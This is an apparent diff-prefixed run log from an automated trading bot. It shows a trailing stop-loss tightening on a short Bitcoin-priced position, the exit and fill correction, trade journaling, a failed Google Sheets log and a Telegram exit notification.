+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72650.87 → 72650.86 (stage 0 best=72600.41 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72650.86 → 72650.78 (stage 0 best=72600.33 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72650.78 → 72650.51 (stage 0 best=72600.06 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72650.51 → 72650.40 (stage 0 best=72599.95 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72650.40 → 72650.28 (stage 0 best=72599.83 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72650.28 → 72650.22 (stage 0 best=72599.77 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72650.22 → 72649.89 (stage 0 best=72599.44 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.89 → 72649.78 (stage 0 best=72599.33 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.78 → 72649.28 (stage 0 best=72598.83 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.28 → 72649.27 (stage 0 best=72598.82 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.27 → 72649.26 (stage 0 best=72598.81 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.26 → 72649.15 (stage 0 best=72598.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.15 → 72649.14 (stage 0 best=72598.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.14 → 72649.11 (stage 0 best=72598.66 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72649.11 → 72648.94 (stage 0 best=72598.49 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72648.94 → 72648.89 (stage 0 best=72598.44 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72648.89 → 72648.88 (stage 0 best=72598.43 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72648.88 → 72648.65 (stage 0 best=72598.20 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72648.65 → 72648.52 (stage 0 best=72598.07 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72648.52 → 72647.23 (stage 0 best=72596.78 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72647.23 → 72647.22 (stage 0 best=72596.77 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72647.22 → 72647.15 (stage 0 best=72596.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72647.15 → 72647.14 (stage 0 best=72596.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72647.14 → 72646.72 (stage 0 best=72596.27 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72646.72 → 72646.69 (stage 0 best=72596.24 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72646.69 → 72646.63 (stage 0 best=72596.18 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72646.63 → 72646.47 (stage 0 best=72596.02 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72646.47 → 72646.34 (stage 0 best=72595.89 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72646.34 → 72646.24 (stage 0 best=72595.79 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72646.24 → 72646.03 (stage 0 best=72595.58 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72646.03 → 72645.92 (stage 0 best=72595.47 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72645.92 → 72645.76 (stage 0 best=72595.31 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72645.76 → 72645.75 (stage 0 best=72595.30 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72645.75 → 72645.14 (stage 0 best=72594.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72645.14 → 72645.11 (stage 0 best=72594.66 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72645.11 → 72644.96 (stage 0 best=72594.51 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72644.96 → 72644.06 (stage 0 best=72593.61 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72644.06 → 72644.05 (stage 0 best=72593.60 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72644.05 → 72644.04 (stage 0 best=72593.59 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72644.04 → 72643.70 (stage 0 best=72593.25 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72643.70 → 72643.44 (stage 0 best=72592.99 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72643.44 → 72643.43 (stage 0 best=72592.98 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72643.43 → 72643.42 (stage 0 best=72592.97 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72643.42 → 72643.15 (stage 0 best=72592.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72643.15 → 72643.14 (stage 0 best=72592.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72643.14 → 72642.86 (stage 0 best=72592.41 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72642.86 → 72642.59 (stage 0 best=72592.14 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72642.59 → 72642.55 (stage 0 best=72592.10 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72642.55 → 72642.45 (stage 0 best=72592.00 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72642.45 → 72642.28 (stage 0 best=72591.83 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72642.28 → 72641.85 (stage 0 best=72591.40 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72641.85 → 72641.82 (stage 0 best=72591.37 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72641.82 → 72641.27 (stage 0 best=72590.82 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72641.27 → 72641.14 (stage 0 best=72590.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72641.14 → 72641.13 (stage 0 best=72590.68 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72641.13 → 72640.83 (stage 0 best=72590.38 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72640.83 → 72640.62 (stage 0 best=72590.17 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72640.62 → 72640.61 (stage 0 best=72590.16 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72640.61 → 72640.31 (stage 0 best=72589.86 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72640.31 → 72640.28 (stage 0 best=72589.83 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72640.28 → 72640.18 (stage 0 best=72589.73 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72640.18 → 72639.82 (stage 0 best=72589.37 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72639.82 → 72639.81 (stage 0 best=72589.36 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72639.81 → 72639.80 (stage 0 best=72589.35 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72639.80 → 72639.20 (stage 0 best=72588.75 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72639.20 → 72639.14 (stage 0 best=72588.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72639.14 → 72639.03 (stage 0 best=72588.58 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72639.03 → 72638.94 (stage 0 best=72588.49 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.94 → 72638.68 (stage 0 best=72588.23 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.68 → 72638.48 (stage 0 best=72588.03 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.48 → 72638.42 (stage 0 best=72587.97 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.42 → 72638.22 (stage 0 best=72587.77 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.22 → 72638.21 (stage 0 best=72587.76 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.21 → 72638.19 (stage 0 best=72587.74 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.19 → 72638.11 (stage 0 best=72587.66 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72638.11 → 72637.93 (stage 0 best=72587.48 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.93 → 72637.91 (stage 0 best=72587.46 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.91 → 72637.87 (stage 0 best=72587.42 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.87 → 72637.58 (stage 0 best=72587.13 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.58 → 72637.46 (stage 0 best=72587.01 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.46 → 72637.36 (stage 0 best=72586.91 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.36 → 72637.15 (stage 0 best=72586.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.15 → 72637.14 (stage 0 best=72586.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72637.14 → 72636.93 (stage 0 best=72586.48 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.93 → 72636.89 (stage 0 best=72586.44 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.89 → 72636.63 (stage 0 best=72586.18 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.63 → 72636.62 (stage 0 best=72586.17 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.62 → 72636.61 (stage 0 best=72586.16 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.61 → 72636.58 (stage 0 best=72586.13 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.58 → 72636.47 (stage 0 best=72586.02 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.47 → 72636.38 (stage 0 best=72585.93 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.38 → 72636.37 (stage 0 best=72585.92 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.37 → 72636.31 (stage 0 best=72585.86 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.31 → 72636.08 (stage 0 best=72585.63 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.08 → 72636.07 (stage 0 best=72585.62 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.07 → 72636.06 (stage 0 best=72585.61 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72636.06 → 72635.89 (stage 0 best=72585.44 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.89 → 72635.88 (stage 0 best=72585.43 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.88 → 72635.81 (stage 0 best=72585.36 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.81 → 72635.75 (stage 0 best=72585.30 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.75 → 72635.68 (stage 0 best=72585.23 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.68 → 72635.47 (stage 0 best=72585.02 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.47 → 72635.38 (stage 0 best=72584.93 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.38 → 72635.29 (stage 0 best=72584.84 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.29 → 72635.15 (stage 0 best=72584.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.15 → 72635.14 (stage 0 best=72584.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72635.14 → 72634.96 (stage 0 best=72584.51 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.96 → 72634.95 (stage 0 best=72584.50 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.95 → 72634.81 (stage 0 best=72584.36 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.81 → 72634.64 (stage 0 best=72584.19 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.64 → 72634.41 (stage 0 best=72583.96 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.41 → 72634.27 (stage 0 best=72583.82 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.27 → 72634.15 (stage 0 best=72583.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.15 → 72634.14 (stage 0 best=72583.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72634.14 → 72633.89 (stage 0 best=72583.44 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.89 → 72633.84 (stage 0 best=72583.39 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.84 → 72633.83 (stage 0 best=72583.38 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.83 → 72633.73 (stage 0 best=72583.28 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.73 → 72633.70 (stage 0 best=72583.25 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.70 → 72633.56 (stage 0 best=72583.11 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.56 → 72633.35 (stage 0 best=72582.90 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.35 → 72633.26 (stage 0 best=72582.81 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.26 → 72633.20 (stage 0 best=72582.75 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.20 → 72633.17 (stage 0 best=72582.72 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.17 → 72633.15 (stage 0 best=72582.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.15 → 72633.14 (stage 0 best=72582.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.14 → 72633.13 (stage 0 best=72582.68 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72633.13 → 72632.78 (stage 0 best=72582.33 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.78 → 72632.75 (stage 0 best=72582.30 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.75 → 72632.50 (stage 0 best=72582.05 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.50 → 72632.16 (stage 0 best=72581.71 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.16 → 72632.15 (stage 0 best=72581.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.15 → 72632.14 (stage 0 best=72581.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.14 → 72632.04 (stage 0 best=72581.59 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.04 → 72632.02 (stage 0 best=72581.57 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72632.02 → 72631.93 (stage 0 best=72581.48 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.93 → 72631.85 (stage 0 best=72581.40 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.85 → 72631.70 (stage 0 best=72581.25 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.70 → 72631.64 (stage 0 best=72581.19 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.64 → 72631.62 (stage 0 best=72581.17 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.62 → 72631.55 (stage 0 best=72581.10 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.55 → 72631.45 (stage 0 best=72581.00 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.45 → 72631.38 (stage 0 best=72580.93 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.38 → 72631.34 (stage 0 best=72580.89 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.34 → 72631.30 (stage 0 best=72580.85 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.30 → 72631.20 (stage 0 best=72580.75 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.20 → 72631.14 (stage 0 best=72580.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72631.14 → 72630.87 (stage 0 best=72580.42 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72630.87 → 72630.77 (stage 0 best=72580.32 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72630.77 → 72630.64 (stage 0 best=72580.19 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72630.64 → 72630.36 (stage 0 best=72579.91 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72630.36 → 72630.20 (stage 0 best=72579.75 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72630.20 → 72630.14 (stage 0 best=72579.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72630.14 → 72629.95 (stage 0 best=72579.50 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.95 → 72629.81 (stage 0 best=72579.36 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.81 → 72629.62 (stage 0 best=72579.17 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.62 → 72629.53 (stage 0 best=72579.08 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.53 → 72629.47 (stage 0 best=72579.02 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.47 → 72629.38 (stage 0 best=72578.93 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.38 → 72629.36 (stage 0 best=72578.91 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.36 → 72629.17 (stage 0 best=72578.72 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.17 → 72629.14 (stage 0 best=72578.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72629.14 → 72628.95 (stage 0 best=72578.50 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.95 → 72628.84 (stage 0 best=72578.39 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.84 → 72628.81 (stage 0 best=72578.36 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.81 → 72628.54 (stage 0 best=72578.09 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.54 → 72628.42 (stage 0 best=72577.97 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.42 → 72628.26 (stage 0 best=72577.81 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.26 → 72628.17 (stage 0 best=72577.72 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.17 → 72628.14 (stage 0 best=72577.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.14 → 72628.06 (stage 0 best=72577.61 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.06 → 72628.05 (stage 0 best=72577.60 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72628.05 → 72627.99 (stage 0 best=72577.54 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.99 → 72627.95 (stage 0 best=72577.50 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.95 → 72627.92 (stage 0 best=72577.47 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.92 → 72627.78 (stage 0 best=72577.33 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.78 → 72627.75 (stage 0 best=72577.30 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.75 → 72627.61 (stage 0 best=72577.16 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.61 → 72627.58 (stage 0 best=72577.13 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.58 → 72627.34 (stage 0 best=72576.89 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.34 → 72627.25 (stage 0 best=72576.80 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.25 → 72627.15 (stage 0 best=72576.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.15 → 72627.14 (stage 0 best=72576.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.14 → 72627.13 (stage 0 best=72576.68 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.13 → 72627.10 (stage 0 best=72576.65 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72627.10 → 72626.95 (stage 0 best=72576.50 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.95 → 72626.92 (stage 0 best=72576.47 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.92 → 72626.88 (stage 0 best=72576.43 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.88 → 72626.64 (stage 0 best=72576.19 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.64 → 72626.51 (stage 0 best=72576.06 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.51 → 72626.45 (stage 0 best=72576.00 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.45 → 72626.35 (stage 0 best=72575.90 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.35 → 72626.34 (stage 0 best=72575.89 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.34 → 72626.33 (stage 0 best=72575.88 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72626.33 → 72625.83 (stage 0 best=72575.38 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72625.83 → 72625.73 (stage 0 best=72575.28 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72625.73 → 72625.69 (stage 0 best=72575.24 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72625.69 → 72625.51 (stage 0 best=72575.06 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72625.51 → 72625.42 (stage 0 best=72574.97 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72625.42 → 72625.41 (stage 0 best=72574.96 src=tick)
+2026-06-01 16:08:35  INFO      trail_loop — [TRAIL] Trail SL: 72625.41 → 72624.79 (stage 0 best=72574.33 src=tick)
+2026-06-01 16:08:46  INFO      trail_loop — [TRAIL] Offset recalibrated: +17.31 → +20.87 (binance=72609.44 delta=72588.57)
+2026-06-01 16:08:46  INFO      trail_loop — [TRAIL] Trail SL: 72624.79 → 72621.85 (stage 0 best=72571.40 src=tick)
+2026-06-01 16:09:17  INFO      trail_loop — [TRAIL] Offset recalibrated: +20.87 → +20.72 (binance=72614.99 delta=72594.27)
+2026-06-01 16:09:35  INFO      trail_loop — [TRAIL] Exit fired: reason=Trail SL (stage 0) price=72624.50 source=tick atr=252.26
+2026-06-01 16:09:35  WARNING   orders.manager — [OM] cancel_bracket failed (ignored): Delta DELETE /v2/orders/bracket returned 404: Not Found
+2026-06-01 16:09:35  INFO      orders.manager — [OM] Closing position | side=buy  reason=Trail SL (stage 0)
+2026-06-01 16:09:36  INFO      orders.manager — [OM] Position closed | id=1339879526  fill=72627.50
+2026-06-01 16:09:36  INFO      trail_loop — [TRAIL] Exit order placed (attempt 1) fill=72627.5
+2026-06-01 16:09:36  INFO      trail_loop — [TRAIL] Fill correction: signal=72624.50 actual=72627.50 diff=+3.00
+2026-06-01 16:09:36  INFO      main — [EXIT] reason=Trail SL (stage 0)  source=tick  entry=72691.0  exit=72627.50  gross_pl=+0.063500 USD
+2026-06-01 16:09:36  INFO      infra.journal — Trade logged [sqlite] | Trend Short SHORT  qty=1 lots  entry=72691.00 exit=72627.50  points=+63.50  P/L=+0.0635 USD  reason=Trail SL (stage 0)
+2026-06-01 16:09:37  ERROR     infra.gsheet — GSheet connection failed: 
+2026-06-01 16:09:37  ERROR     infra.gsheet — GSheet log_trade failed: 
+2026-06-01 16:09:37  INFO      infra.journal — Open trade cleared from DB
+2026-06-01 16:09:37  INFO      infra.telegram — Telegram sent: '💰 <b>EXIT — SHORT</b>  |  <code>1</code> lot\n<code>2026-06-01 16:09:37 IST</code>\n\nEntry         : <code>$72,691.00</code>\nExit          : <b>$72,627.50</b>\nPoints        : <code>+63.50</code>\n<b>Gross P&amp;L : +$0.0635 USD</b>\nReason        : <code>Trail SL (stage 0)</code>'
